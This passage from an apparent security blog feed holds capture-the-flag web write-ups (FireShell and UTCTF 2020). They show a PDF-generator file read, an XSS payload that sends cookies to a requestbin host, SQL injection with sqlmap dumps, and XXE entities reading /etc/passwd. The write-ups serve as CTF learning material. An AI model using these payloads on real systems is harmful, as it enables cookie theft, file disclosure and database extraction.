class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Lets understand the code a bit. A XMLHttpRequest object is created and assigned to x at line 5. function will run once the page loads due to onload event at line 6 and write the response received from the request in the HTML page at line 7. Line 9 and 10 will make a request to &#x2F;etc&#x2F;passwd on the system where the HTML page is running due to the file:&#x2F;&#x2F; URI scheme and retrieve its contents. Usually file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd is replaced by some URL such as <a href="https://securitytaters.info/">https://securitytaters.info/</a> in normal XHR requests.</p><p>Supplying the URL from filebin with above payload executed it and gave us the results of &#x2F;etc&#x2F;passwd file.</p><p><img src="/solving-screenshoter-from-fireshell-ctf-2020/9.3.jpg" alt="alt"></p><p>Replacing &#x2F;etc&#x2F;passwd with &#x2F;flag as mentioned in the challenge note gave me the flag.</p><p><img src="/solving-screenshoter-from-fireshell-ctf-2020/9.4.jpg" alt="alt"></p><p>Thanks for reading and thanks FireShell team from the challs. Feel free to contact me on twitter for any queries or feedback. Cheers!!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> file read </tag>
            
            <tag> phantomjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving URL to PDF from FireShell CTF 2020</title>
      <link href="/solving-url-to-pdf-from-fireshell-ctf-2020/"/>
      <url>/solving-url-to-pdf-from-fireshell-ctf-2020/</url>
      
        <content type="html"><![CDATA[<p>The URL to PDF from FireShell CTF 2020 challenge note:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Please test our brand new service.</span><br><span class="line"></span><br><span class="line">flag is on /flag</span><br><span class="line"></span><br><span class="line">https://urltopdf.fireshellsecurity.team/</span><br></pre></td></tr></table></figure><p>Accessing the URL sends us to a website which converts the page at a given URL to PDF. Immediately a talk related to this comes to mind. Owning the clout through SSRF and PDF generators which highlights issues in PDF generation when inputs are not properly validated when generating PDF primarily allowing SSRF or local file read among other things.</p><p>So let’s identify the PDF generator as mentioned in the talk. I am using requestbin here as usual to log requests and analyze it. </p><p><img src="/solving-url-to-pdf-from-fireshell-ctf-2020/8.1.jpg" alt="alt"></p><p>We see that the user agent is mentioned as WeasyPrint 51 (<a href="http://weasyprint.org/">http://weasyprint.org/</a>) </p><p><img src="/solving-url-to-pdf-from-fireshell-ctf-2020/8.2.jpg" alt="alt"></p><p>Now we need to prepare a HTML page which can be provided for PDF conversion via a URL. As mentioned in the talk we will need to use <link rel=attachment href="file:///etc/passwd"> payload as part of the HTML page. I used &#x2F;etc&#x2F;hosts instead of usual passwd file. HTML page was as follows. I hosted it using filebin and provide the URL for PDF generator.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;link rel=attachment href=&quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>After downloading the PDF I needed to decode the data from PDF to readable format. Retrieving the contents was something I had to search since results are not displayed directly in the PDF but are hidden inside FlateDecode part of the PDF. The utility mentioned in the talk was not available on the internet or I couldn’t find it. After searching around for a while I found a linux utility called qpdf which I used as follows.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qpdf --qdf --object-streams=disable 1f51f044e0ca6c90d995ab9b4e2bd23c.pdf out.pdf</span><br></pre></td></tr></table></figure><p>Reading the output pdf in text editor gave me the contents of the &#x2F;etc&#x2F;hosts as shown.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line"># Kubernetes-managed hosts file.</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">fe00::0 ip6-mcastprefix</span><br><span class="line">fe00::1 ip6-allnodes</span><br><span class="line">fe00::2 ip6-allrouters</span><br><span class="line">10.244.0.22     url-to-pdf-8f9ddf549-prfvm</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure><p>Now replacing the &#x2F;etc&#x2F;hosts with &#x2F;flag as mentioned in the challenge note gave me the flag.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">F#&#123;th4nk5_t0_Ben_Sadeghipour_&amp;_Cody_Brocious&#125;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure><p>Thanks for reading. Feel free to contact me on twitter for any queries or feedback. Cheers!!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> file read </tag>
            
            <tag> PDF generators </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving Chatt with Bratt from UTCTF 2020</title>
      <link href="/solving-chatt-with-bratt-from-utctf-2020/"/>
      <url>/solving-chatt-with-bratt-from-utctf-2020/</url>
      
        <content type="html"><![CDATA[<p>The CTF challenge note:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">After announcing that he would be having an anonymous 1-on-1 AMA with randomly chosen, adoring fans, an engineering team hacked together a web app and likely forget to patch some obvious security holes.   </span><br><span class="line">Anyway, you&#x27;re one of the lucky fans chosen to chatt with Bratt Pid!</span><br><span class="line"></span><br><span class="line">Have fun: web3.utctf.live:8080</span><br><span class="line"></span><br><span class="line">by phleisch</span><br></pre></td></tr></table></figure><p>A chatting web app was the target this time which looked like below.</p><p><img src="/solving-chatt-with-bratt-from-utctf-2020/7.1.jpg" alt="alt"></p><p>Sending any message generated request like below</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/chatt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web3.utctf.live:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web3.utctf.live:8080/chatt</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web3.utctf.live:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>18</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>chat_id=4325eda0-6143-11ea-90ec-d22523ec0ff6; secret=none</span><br><span class="line"></span><br><span class="line"><span class="language-css">&#123;&quot;<span class="attribute">content</span>&quot;:<span class="string">&quot;test&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure><p>And messages were retrieved time to time by below request.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /messages HTTP/1.1</span><br><span class="line">Host: web3.utctf.live:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://web3.utctf.live:8080/chatt</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: chat_id=4325eda0-6143-11ea-90ec-d22523ec0ff6; secret=none</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Sun, 08 Mar 2020 13:47:11 GMT</span><br><span class="line">Content-Length: 128</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Messages&quot;:[&#123;&quot;Chat_ID&quot;:&quot;4325eda0-6143-11ea-90ec-d22523ec0ff6&quot;,&quot;Content&quot;:&quot;test&quot;,&quot;Msg_Sent&quot;:&quot;2020-03-08T13:46:55Z&quot;,&quot;User_ID&quot;:1&#125;]&#125;</span><br></pre></td></tr></table></figure><p>Only a few attack scenarios looked viable which included XSS or SSRF. There were no protections against XSS whatsoever so I went on to check if I could pop an alert with cookies in it with following payload as a chat message. The payload will fire when there is an error to get the image using src since its not available at location x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=this.src=alert(document.cookie);&gt;</span><br></pre></td></tr></table></figure><p>That gave us the alert with cookies in it. So the next step was to retrieve cookies of Bratt to see if it has anything of use. Payload used was a below. I used requestbin to capture the cookies. The payload appends cookie value to the parameter a and sends it to our requestbin. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=this.src=&#x27;https://enz6vefoyu8n.x.pipedream.net/leak?a=&#x27;+document.cookie;&gt;</span><br></pre></td></tr></table></figure><p>That worked and it landed us the flag. As simple as it gets.</p><p><img src="/solving-chatt-with-bratt-from-utctf-2020/7.2.jpg" alt="alt"></p><p>Thanks to UTCTF Team for the chall. Feel free to contact me on twitter for queries or feedback. Cheers!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving Epic Admin PWN from UTCTF 2020</title>
      <link href="/solving-epic-admin-pwn-from-utctf-2020/"/>
      <url>/solving-epic-admin-pwn-from-utctf-2020/</url>
      
        <content type="html"><![CDATA[<p>The CTF challenge note:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">this challenge is epic i promise</span><br><span class="line"></span><br><span class="line">the flag is the password</span><br><span class="line">http://web2.utctf.live:5006/</span><br><span class="line"></span><br><span class="line">by matt</span><br></pre></td></tr></table></figure><p>The challenge page had a login form which generated following request.</p><p>Request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web2.utctf.live:5006</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>23</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web2.utctf.live:5006</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web2.utctf.live:5006/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-bash">username=<span class="built_in">test</span>&amp;pass=<span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><p>After poking around the application to see how it reacts, I landed with auth bypass with admin’– payload which I usually try as follows.</p><p>Request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web2.utctf.live:5006</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>28</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web2.utctf.live:5006</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web2.utctf.live:5006/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">username</span>=admin%<span class="number">27</span>--&amp;pass=asd</span></span><br></pre></td></tr></table></figure><p>Response:<br><img src="/solving-epic-admin-pwn-from-utctf-2020/6.1.jpg" alt="alt"></p><p>But that did not earn anything interesting as opposed to my expectations. I looked around the source for any hints and but didnt find anything. Not even a single JS file. Rest of the code and css files had nothing of value. So after a hint from the discord channel it was time to expand on the same issue that got me the admin in the first place. Extending auth bypass to SQLi. So I let loose sqlmap to see it if works and it did. Passing the login request to sqlmap using text file did the work.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req1.txt --flush -v -p username</span><br><span class="line">    ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.3#pip&#125;</span><br><span class="line">|_ -| . [)]     | .&#x27;| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 11:30:22 /2020-03-07/</span><br><span class="line"></span><br><span class="line">[11:30:22] [INFO] parsing HTTP request from &#x27;req1.txt&#x27;</span><br><span class="line">[11:30:22] [DEBUG] not a valid WebScarab log data</span><br><span class="line">[11:30:22] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[11:30:22] [DEBUG] setting the HTTP timeout</span><br><span class="line">[11:30:22] [DEBUG] setting the HTTP User-Agent header</span><br><span class="line">[11:30:22] [DEBUG] creating HTTP requests opener object</span><br><span class="line">[11:30:22] [DEBUG] resolving hostname &#x27;web2.utctf.live&#x27;</span><br><span class="line">[11:30:22] [INFO] testing connection to the target URL</span><br><span class="line">[11:30:22] [DEBUG] declared web page charset &#x27;utf-8&#x27;</span><br><span class="line">[11:30:22] [INFO] checking if the target is protected by some kind of WAF/IPS</span><br><span class="line">[11:30:22] [INFO] testing if the target URL content is stable</span><br><span class="line">[11:30:23] [INFO] target URL content is stable</span><br><span class="line">[11:30:23] [WARNING] heuristic (basic) test shows that POST parameter &#x27;username&#x27; might not be injectable</span><br><span class="line">[11:30:23] [INFO] testing for SQL injection on POST parameter &#x27;username&#x27;</span><br><span class="line">[11:30:24] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br><span class="line"></span><br><span class="line">--------------- SNIP --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[11:31:20] [INFO] checking if the injection point on POST parameter &#x27;username&#x27; is a false positive</span><br><span class="line">[11:31:31] [DEBUG] checking for filtered characters</span><br><span class="line">POST parameter &#x27;username&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 92 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span><br><span class="line">    Payload: username=admin&#x27;;SELECT PG_SLEEP(5)--&amp;pass=asd</span><br><span class="line">    Vector: ;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)--</span><br><span class="line">---</span><br><span class="line">[11:33:18] [INFO] the back-end DBMS is PostgreSQL</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[11:33:18] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/web2.utctf.live&#x27;</span><br></pre></td></tr></table></figure><p>As we can see the sqlmap returned the injected query and it shows PostgreSQL as the backend database. A blind sqli with stacked queries. So I continued with sqlmap to retrive current DB name with below command.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req1.txt -v -p username --current-db</span><br><span class="line"></span><br><span class="line">--------------- SNIP --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[11:34:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">[11:34:35] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">public</span><br><span class="line">[11:34:59] [DEBUG] performed 46 queries in 53.31 seconds</span><br><span class="line">[11:34:59] [WARNING] on PostgreSQL you&#x27;ll need to use schema names for enumeration as the counterpart to database names on other DBMSes</span><br><span class="line">current schema (equivalent to database on PostgreSQL): &#x27;public&#x27;</span><br></pre></td></tr></table></figure><p>And retrieved the entire public DB as follows that gave us the flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r req1.txt -v -p username --dump</span><br><span class="line"></span><br><span class="line">--------------- SNIP --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[11:40:54] [DEBUG] performed 39 queries in 22.33 seconds</span><br><span class="line">[11:40:54] [DEBUG] analyzing table dump for possible password hashes</span><br><span class="line">Database: public</span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+---------+----------+--------------------------+</span><br><span class="line">| id      | username | password                 |</span><br><span class="line">+---------+----------+--------------------------+</span><br><span class="line">| &lt;blank&gt; | admin    | utflag&#123;dual1pa1sp3rf3ct&#125; |</span><br><span class="line">+---------+----------+--------------------------+</span><br></pre></td></tr></table></figure><p>That was all it took to get the flag. Thanks to UTCTF Team for the chall. Feel free to contact me on twitter for queries or feedback. Cheers!!</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> sql injection </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving Spooky Store from UTCTF 2020</title>
      <link href="/solving-spooky-store-from-utctf-2020/"/>
      <url>/solving-spooky-store-from-utctf-2020/</url>
      
        <content type="html"><![CDATA[<p>The CTF challenge was a below.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">It&#x27;s a simple webpage with 3 buttons, you got this :)</span><br><span class="line"></span><br><span class="line">http://web1.utctf.live:5005/</span><br><span class="line"></span><br><span class="line">by matt</span><br></pre></td></tr></table></figure><p>Opening the challenge URL shows a page with 3 locations and an option to Check Nearest Location on each. Clicking on one of them, generated following request and response.</p><p>Request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/location</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web1.utctf.live:5005</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://web1.utctf.live:5005/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web1.utctf.live:5005</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>93</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">locationCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;/<span class="name">locationCheck</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sat, 07 Mar 2020 08:58:01 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/1.0.0 Python/3.8.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>60</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">The</span> nearest coordinates to you are: <span class="number">25</span>.<span class="number">0000</span>Â° N, <span class="number">71</span>.<span class="number">0000</span>Â° W</span></span><br></pre></td></tr></table></figure><p>Post request body contains XML data so there is a big chance of XML related issues and it did smell like XXE ;). So I searched around for some payloads that I could use and landed <a href="https://github.com/1N3/IntruderPayloads/blob/master/FuzzLists/xml-attacks.txt">here</a>. Using some of the payloads directly did not result in anything interesting, so it was time to step back and think.</p><p>As it turned out, I needed to use already available &lt;productId&gt; tag to reference the entity. The initial payload which included random tag &lt;blah&gt; as below did not work.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;blah&gt;&amp;xxe;&lt;/blah&gt;</span><br></pre></td></tr></table></figure><p>But this payload below did work using the already available tag.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;blah&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/blah&gt;</span><br></pre></td></tr></table></figure><p>Another payload that earned the same results was</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;locationCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/locationCheck&gt;</span><br></pre></td></tr></table></figure><p>So the final request was generated to get the flag on the last line of response looked like this.</p><p>Request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/location</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web1.utctf.live:5005</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 